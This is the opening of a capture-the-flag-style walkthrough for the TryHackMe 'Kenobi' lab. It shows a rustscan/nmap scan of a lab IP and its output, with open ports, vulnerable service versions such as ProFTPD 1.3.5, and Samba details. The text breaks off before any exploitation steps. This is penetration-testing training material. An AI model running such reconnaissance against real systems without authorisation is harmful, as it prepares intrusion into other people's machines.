<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

https://tryhackme.com/r/room/kenobi"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/posts/Kenobi/"><meta property="og:site_name" content="乃 | Notes"><meta property="og:title" content="Kenobi"><meta property="og:description" content=" Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.
https://tryhackme.com/r/room/kenobi"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><meta property="article:tag" content="ProFTPD"><meta property="article:tag" content="Privilege Escalation"><title>Kenobi | 乃 | Notes</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.ico><link rel=canonical href=http://localhost:1313/posts/Kenobi/><link rel=stylesheet href=/book.min.3d18fa05b76b82b30ac3643bbfae69f2ce032c45656822ab603a9ab3c171169c.css integrity="sha256-PRj6BbdrgrMKw2Q7v65p8s4DLEVlaCKrYDqas8FxFpw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.076c7d43a8bb37e2dea96dfc7f4974ac6890e3c723d75f8e2a5262d01a6b1ef0.js integrity="sha256-B2x9Q6i7N+LeqW38f0l0rGiQ48cj11+OKlJi0BprHvA=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>乃 | Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Try Hack Me</a></label><ul><li><a href=/docs/TryHackMe/Vulnversity/>Vulnversity</a></li><li><a href=/docs/TryHackMe/Blue/>Blue</a></li><li><a href=/docs/TryHackMe/Kenobi/>Kenobi</a></li><li><a href=/docs/TryHackMe/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/TryHackMe/DailyBugle/>Daily Bugle</a></li><li><input type=checkbox id=section-dc206046287ffa2f9f9eb19899142c24 class=toggle>
<label for=section-dc206046287ffa2f9f9eb19899142c24 class="flex justify-between"><a role=button>Interview Prep</a></label><ul><li><input type=checkbox id=section-9b25dbcced7358da0b38b383e438c2b6 class=toggle>
<label for=section-9b25dbcced7358da0b38b383e438c2b6 class="flex justify-between"><a role=button>Defensive</a></label><ul><li><a href=/docs/TryHackMe/InterviewPrep/Defensive/DetectionTechniques/>Detection Techniques</a></li></ul></li></ul></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Kenobi</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#approach-1>Approach 1</a></li><li><a href=#approach-2>Approach 2</a></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/Kenobi/>Kenobi</a></h1><h5>May 23, 2023</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/ProFTPD/>ProFTPD</a>,
<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><blockquote><p>Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.</p></blockquote><p><a href=https://tryhackme.com/r/room/kenobi>https://tryhackme.com/r/room/kenobi</a></p><h1 id=scanning>Scanning
<a class=anchor href=#scanning>#</a></h1><p>First we will deploy the machine and scan the target using rustscan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> rustscan <span style=color:#f92672>-</span>a <span style=color:#ae81ff>10.10.112.104</span> <span style=color:#f92672>--</span> <span style=color:#f92672>-</span>sVC <span style=color:#f92672>|</span> lolcat
</span></span><span style=display:flex><span><span style=color:#f92672>.----.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.----..---.</span>  <span style=color:#f92672>.----.</span> <span style=color:#f92672>.---.</span>   <span style=color:#f92672>.--.</span>  <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> {}  }<span style=color:#f92672>|</span> { } <span style=color:#f92672>|</span>{ {__ {_   _}{ {__  <span style=color:#f92672>/</span>  ___} <span style=color:#f92672>/</span> {} \ <span style=color:#f92672>|</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>|</span> <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#f92672>.-.</span> \<span style=color:#f92672>|</span> {_} <span style=color:#f92672>|.-.</span>_} } <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>.-.</span>_} }\     }<span style=color:#f92672>/</span>  <span style=color:#f92672>/</span>\  \<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>\  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39; `-&#39;</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-----</span><span style=color:#e6db74>&#39;`----&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;  `----&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>---</span><span style=color:#e6db74>&#39; `-&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;`-&#39;</span> <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>The Modern Day Port Scanner<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>________________________________________
</span></span><span style=display:flex><span>: http:<span style=color:#f92672>//</span>discord<span style=color:#f92672>.</span>skerritt<span style=color:#f92672>.</span>blog           :
</span></span><span style=display:flex><span>: https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>RustScan<span style=color:#f92672>/</span>RustScan :
</span></span><span style=display:flex><span> <span style=color:#f92672>--------------------------------------</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>day was here <span style=color:#960050;background-color:#1e0010>♥</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] The config file <span style=color:#f92672>is</span> expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] File limit <span style=color:#f92672>is</span> lower than default batch size<span style=color:#f92672>.</span> Consider upping <span style=color:#66d9ef>with</span> <span style=color:#f92672>--</span>ulimit<span style=color:#f92672>.</span> May cause harm to sensitive servers
</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] Your file limit <span style=color:#f92672>is</span> very small, which negatively impacts RustScan<span style=color:#e6db74>&#39;s speed. Use the Docker image, or up the Ulimit with &#39;</span><span style=color:#f92672>--</span>ulimit <span style=color:#ae81ff>5000</span><span style=color:#e6db74>&#39;. </span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>21</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>22</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>111</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>139</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>445</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>2049</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>39105</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>44337</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>51941</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#ae81ff>56481</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] Starting Script(s)
</span></span><span style=display:flex><span>[<span style=color:#f92672>&gt;</span>] Running script <span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}} -sVC&#34;</span> on ip <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Depending on the complexity of the script, results may take some time to appear<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] Starting Nmap <span style=color:#ae81ff>7.93</span> ( https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org ) at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span> <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span> EDT
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Script Pre<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>10.10.112.104</span> [<span style=color:#ae81ff>4</span> ports]
</span></span><span style=display:flex><span>Completed Ping Scan at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>0.15</span>s elapsed (<span style=color:#ae81ff>1</span> total hosts)
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host<span style=color:#f92672>.</span> at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host<span style=color:#f92672>.</span> at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>0.04</span>s elapsed
</span></span><span style=display:flex><span>DNS resolution of <span style=color:#ae81ff>1</span> IPs took <span style=color:#ae81ff>0.04</span>s<span style=color:#f92672>.</span> Mode: Async [<span style=color:#75715e>#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>10.10.112.104</span> [<span style=color:#ae81ff>11</span> ports]
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>21</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>56481</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>39105</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>44337</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>51941</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>0.27</span>s elapsed (<span style=color:#ae81ff>11</span> total ports)
</span></span><span style=display:flex><span>Initiating Service scan at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>11</span> services on <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Completed Service scan at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>12.08</span>s elapsed (<span style=color:#ae81ff>11</span> services on <span style=color:#ae81ff>1</span> host)
</span></span><span style=display:flex><span>NSE: Script scanning <span style=color:#ae81ff>10.10.112.104</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>3.95</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>0.99</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Host <span style=color:#f92672>is</span> up, received timestamp<span style=color:#f92672>-</span>reply ttl <span style=color:#ae81ff>61</span> (<span style=color:#ae81ff>0.12</span>s latency)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Scanned at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span> <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>45</span>:<span style=color:#ae81ff>50</span> EDT <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>18</span>s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE     REASON         VERSION
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span><span style=color:#f92672>/</span>tcp    open  ftp         syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> ProFTPD <span style=color:#ae81ff>1.3.5</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>tcp    open  ssh         syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> OpenSSH <span style=color:#ae81ff>7.2</span>p2 Ubuntu <span style=color:#ae81ff>4</span>ubuntu2<span style=color:#ae81ff>.7</span> (Ubuntu Linux; protocol <span style=color:#ae81ff>2.0</span>)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ssh<span style=color:#f92672>-</span>hostkey: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>2048</span> b3ad834149e95d168d3b0f057be2c0ae (RSA)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ssh<span style=color:#f92672>-</span>rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH<span style=color:#f92672>/</span>X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs<span style=color:#f92672>+</span>xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G<span style=color:#f92672>+</span>VPc2DbbtSXcpu5c14HUzktDmsnfJo<span style=color:#f92672>/</span><span style=color:#ae81ff>5</span>TFiRuYR0uqH8oDl6Zy3JSnbYe<span style=color:#f92672>/</span>QY<span style=color:#f92672>+</span>AfTpr1q7BDV85b6xP97<span style=color:#f92672>/</span><span style=color:#ae81ff>1</span>WUTCw54CKUTV25Yc5h615EwQOMPwox94<span style=color:#f92672>+</span><span style=color:#ae81ff>48</span>JVmgE00T4ARC3l6YWibqY6a5E8BU<span style=color:#f92672>+</span>fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj                                                                                                                                                                                   
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>256</span> f8277d642997e6f865546522f7c81d8a (ECDSA)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ecdsa<span style=color:#f92672>-</span>sha2<span style=color:#f92672>-</span>nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F<span style=color:#f92672>+</span>Cdeme1O<span style=color:#f92672>+</span>vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>256</span> <span style=color:#ae81ff>5</span>a06edebb6567e4c01ddeabcbafa3379 (ED25519)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_ssh<span style=color:#f92672>-</span>ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o<span style=color:#f92672>/</span>h9e6Ea<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span>kHMT0Dz2GqSodFqIWDi
</span></span><span style=display:flex><span><span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp    open  http        syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Apache httpd <span style=color:#ae81ff>2.4.18</span> ((Ubuntu))
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>robots<span style=color:#f92672>.</span>txt: <span style=color:#ae81ff>1</span> disallowed entry 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_<span style=color:#f92672>/</span>admin<span style=color:#f92672>.</span>html
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>methods: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  Supported Methods: POST OPTIONS GET HEAD
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Site doesn<span style=color:#e6db74>&#39;t have a title (text/html).</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4.18</span> (Ubuntu)
</span></span><span style=display:flex><span><span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>tcp   open  rpcbind     syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span> (RPC <span style=color:#75715e>#100000)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rpcinfo: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   program version    port<span style=color:#f92672>/</span>proto  service
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100000</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>        <span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>tcp   rpcbind
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100000</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>        <span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>udp   rpcbind
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100000</span>  <span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>          <span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>tcp6  rpcbind
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100000</span>  <span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>          <span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>udp6  rpcbind
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100003</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>       <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>tcp   nfs
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100003</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>       <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>tcp6  nfs
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100003</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>       <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>udp   nfs
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100003</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>       <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>udp6  nfs
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100005</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>      <span style=color:#ae81ff>36941</span><span style=color:#f92672>/</span>udp   mountd
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100005</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>      <span style=color:#ae81ff>44306</span><span style=color:#f92672>/</span>udp6  mountd
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100005</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>      <span style=color:#ae81ff>50675</span><span style=color:#f92672>/</span>tcp6  mountd
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100005</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>      <span style=color:#ae81ff>56481</span><span style=color:#f92672>/</span>tcp   mountd
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100021</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>      <span style=color:#ae81ff>41673</span><span style=color:#f92672>/</span>tcp6  nlockmgr
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100021</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>      <span style=color:#ae81ff>44337</span><span style=color:#f92672>/</span>tcp   nlockmgr
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100021</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>      <span style=color:#ae81ff>45479</span><span style=color:#f92672>/</span>udp6  nlockmgr
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100021</span>  <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>      <span style=color:#ae81ff>59376</span><span style=color:#f92672>/</span>udp   nlockmgr
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100227</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>         <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>tcp   nfs_acl
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100227</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>         <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>tcp6  nfs_acl
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>100227</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>         <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>udp   nfs_acl
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>100227</span>  <span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>         <span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>udp6  nfs_acl
</span></span><span style=display:flex><span><span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp   open  netbios<span style=color:#f92672>-</span>ssn syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Samba smbd <span style=color:#ae81ff>3.</span>X <span style=color:#f92672>-</span> <span style=color:#ae81ff>4.</span>X (workgroup: WORKGROUP)
</span></span><span style=display:flex><span><span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp   open  netbios<span style=color:#f92672>-</span>ssn syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Samba smbd <span style=color:#ae81ff>4.3.11</span><span style=color:#f92672>-</span>Ubuntu (workgroup: WORKGROUP)
